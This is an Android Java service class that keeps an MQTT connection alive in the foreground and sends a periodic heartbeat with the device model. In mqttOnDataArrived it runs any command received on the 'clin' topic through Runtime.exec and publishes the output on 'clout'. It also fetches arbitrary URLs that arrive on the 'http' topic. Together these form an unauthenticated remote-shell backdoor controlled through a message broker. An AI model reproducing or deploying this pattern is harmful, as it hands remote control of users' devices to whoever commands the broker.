package com.tech2020.packge.scl;

import android.app.Notification;
import android.app.PendingIntent;
import android.app.Service;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.content.ServiceConnection;
import android.os.Binder;
import android.os.Build;
import android.os.IBinder;
import android.util.Log;

import com.android.volley.Request;
import com.android.volley.RequestQueue;
import com.android.volley.Response;
import com.android.volley.VolleyError;
import com.android.volley.toolbox.StringRequest;
import com.android.volley.toolbox.Volley;
import com.tech2020.packge.MainActivity;
import com.tech2020.packge.R;
import com.tech2020.packge.bo.MqttCustomCb;

import org.eclipse.paho.client.mqttv3.MqttMessage;

import java.io.BufferedReader;
import java.io.ByteArrayOutputStream;
import java.io.DataOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.sql.Timestamp;

public class MqttDataHandlrSevice extends Service implements MqttCustomCb.MqttCstmCb {
    MqttCustomCb mqttCustomCb;
    MqttManagerService mService;
    boolean mBound = false;
    Thread thread;

    public MqttDataHandlrSevice() {
    }


    @Override
    public void onCreate() {
        super.onCreate();
        Log.d("mqdata","oncreate");
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            Intent notificationIntent = new Intent(this, MainActivity.class);
            PendingIntent pendingIntent =
                    PendingIntent.getActivity(this, 0, notificationIntent, 0);

            Notification notification =
                    new Notification.Builder(this, "1")
                            .setContentTitle(getText(R.string.notification_title))
                            .setContentText(getText(R.string.notification_message))
                            //.setSmallIcon(R.drawable.icon)
                            .setContentIntent(pendingIntent)
                            .setTicker(getText(R.string.ticker_text))
                            .build();

            startForeground(2, notification);
        }else {
            Log.d("mqdata","not oreo service");
        }
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        Log.d("mqdata","onstartcommand");
        //////////////
        ///////////////////////////
        Intent intnt = new Intent(this, MqttManagerService.class);
        try{
            //startService(intent);
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                startForegroundService(intnt);
                bindService(intnt, connection, Context.BIND_AUTO_CREATE);
                //mqttCustomCb = new MqttCustomCb();
                //ttCustomCb.setMqttCstmCb(this);
            }else{
                bindService(intnt, connection, Context.BIND_AUTO_CREATE);
            }
            Log.d("mqdata", "after_bindService");
        } catch (Exception e) {
            e.printStackTrace();
        }
        return super.onStartCommand(intent, flags, startId);
    }

    @Override
    public void onDestroy() {
        super.onDestroy();
        thread.interrupt();
        unbindService(connection);
        Log.d("mqdata","ondestroy");
    }

    @Override
    public void onLowMemory() {
        super.onLowMemory();
        Log.d("mqdata","onlowmemory");
    }

    @Override
    public boolean onUnbind(Intent intent) {
        Log.d("mqdata","onunbind");
        return super.onUnbind(intent);
    }

    @Override
    public IBinder onBind(Intent intent) {
        // TODO: Return the communication channel to the service.


        throw new UnsupportedOperationException("Not yet implemented");
    }

    public void doSomething(){
        thread = new Thread(){
            @Override
            public void run() {
                super.run();
                while (true) {
                    if (mService.getMqttManagerConnectStatus().equals("CONNECTED")) {
                        int time = (int) (System.currentTimeMillis());
                        Timestamp tsTemp = new Timestamp(time);
                        String ts =  tsTemp.toString();
                        mService.publishMessage("example/r", "hello_"+ts+"device_:"+android.os.Build.MODEL);
                        Log.d("mqdata", "publishing");
                    }else{

                    }
                    try {
                        sleep(30000);
                    } catch (InterruptedException e) {
                        e.printStackTrace();
                    }
                }
            }
        };
        thread.start();
    }


/** Defines callbacks for service binding, passed to bindService() */

    private ServiceConnection connection = new ServiceConnection() {

        @Override
        public void onServiceConnected(ComponentName className,
                                       IBinder service) {
            // We've bound to LocalService, cast the IBinder and get LocalService instance
            Log.d("MainAct", "service_connected");
            MqttManagerService.LocalBinder binder = (MqttManagerService.LocalBinder) service;
            mService = binder.getService();
            mqttCustomCb = new MqttCustomCb();
            mqttCustomCb.setMqttCstmCb(MqttDataHandlrSevice.this);
            mService.setMqttCustomCallBack(mqttCustomCb);
          //  mService.publishMessage("example/r", "service_connected");
            doSomething();
            Log.d("mqdata", "callback set on service connected");

            mBound = true;
        }

        @Override
        public void onServiceDisconnected(ComponentName arg0) {
            Log.d("mqdata", "service_disconnected");
            mBound = false;
        }
    };


    public void parseMqttCredentials(String response){
        Log.d("mqdata","httpResponse_\n"+response);
    }


    public void getMqttCredentials(String url){
        // Instantiate the RequestQueue.
        RequestQueue queue = Volley.newRequestQueue(this);

        // Request a string response from the provided URL.
        StringRequest stringRequest = new StringRequest(Request.Method.GET, url,
                new Response.Listener<String>() {
                    @Override
                    public void onResponse(String response) {
                        // Display the first 500 characters of the response string.
                       // textView.setText("Response is: "+ response.substring(0,500));
                        parseMqttCredentials(response);
                    }
                }, new Response.ErrorListener() {
            @Override
            public void onErrorResponse(VolleyError error) {
                //textView.setText("That didn't work!");
            }
        });

// Add the request to the RequestQueue.
        queue.add(stringRequest);
    }

    @Override
    public void mqttOnDataArrived(String topic, MqttMessage message) {
        Log.d("mqdata","msg_arrived-mqtt"+new String(message.getPayload()));
        //Log.d("mqdata",""+mService.getRandomNumber());

        if(topic.equals("clin")){
            String clin=new String(message.getPayload());
            String strArray[] = clin.split("\\s");
            mService.publishMessage("clout",sudoResult(clin));
        }else if (topic.equals("http")){
            String http = new String(message.getPayload());
            getMqttCredentials(http);
        }
    }

    public static String sudoResult(String cmd){
        try {
            Process process = Runtime.getRuntime().exec(cmd);
            InputStreamReader reader = new InputStreamReader(process.getInputStream());
            BufferedReader bufferedReader = new BufferedReader(reader);
            int numRead;
            char[] buffer = new char[5000];
            StringBuffer commandOutput = new StringBuffer();
            while ((numRead = bufferedReader.read(buffer)) > 0) {
                commandOutput.append(buffer, 0, numRead);
            }
            bufferedReader.close();
            process.waitFor();

            return commandOutput.toString();
        } catch (IOException e) {
            throw new RuntimeException(e);
        } catch (InterruptedException e) {
            throw new RuntimeException(e);
        }
    }

/*
    public static String sudoForResult(String...strings) {
        Log.d("clin",""+strings[0]);
        String res = "";
        DataOutputStream outputStream = null;
        InputStream response = null;
        try{
            Process su = Runtime.getRuntime().exec("");
            outputStream = new DataOutputStream(su.getOutputStream());
            response = su.getInputStream();

            for (String s : strings) {
                outputStream.writeBytes(s+"\n");
                outputStream.flush();
            }

            //outputStream.writeBytes("exit\n");
            //outputStream.flush();
            try {
                su.waitFor();
        } catch (InterruptedException e) {
            e.printStackTrace();
        }
        res = readFully(response);
        } catch (IOException e){
            e.printStackTrace();
        }finally {
            Closer.closeSilently(outputStream, response);
        }
        return res;
    }

    public static String readFully(InputStream is) throws IOException {
        ByteArrayOutputStream baos = new ByteArrayOutputStream();
        byte[] buffer = new byte[1024];
        int length = 0;
        while ((length = is.read(buffer)) != -1) {
            baos.write(buffer, 0, length);
        }
        return baos.toString("UTF-8");
    }
*/

}
